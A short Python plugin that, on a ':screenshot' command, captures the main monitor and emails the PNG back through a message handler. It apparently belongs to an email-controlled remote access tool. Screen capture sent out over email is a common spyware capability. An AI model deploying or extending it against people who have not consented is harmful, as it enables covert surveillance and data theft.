import mss
import datetime
import io
from mss.tools import to_png

class screenshot:
    def __init__(self):
        self.info = "📸 Snaps a pic of the screen and sends it over like 💨"
        self.name = "screenshot"
        self.args = []
        self.isCrossPlatfrom = True
        self.command = ":screenshot"

    def run(self,emailHandler,msgId):
        with mss.mss() as sct:
            screenshot = sct.grab(sct.monitors[1])
            img_bytes = io.BytesIO()
            img_bytes.write(to_png(screenshot.rgb, screenshot.size))            
            img_bytes.seek(0)
            bytes = img_bytes.getvalue()
            emailHandler.send_file(
                file = bytes,
                filename = f"{datetime.datetime.now().strftime('%H:%M:%S')}.png",
                msgId=msgId,
                message="Screenshot is given below"
            )
            return None
        

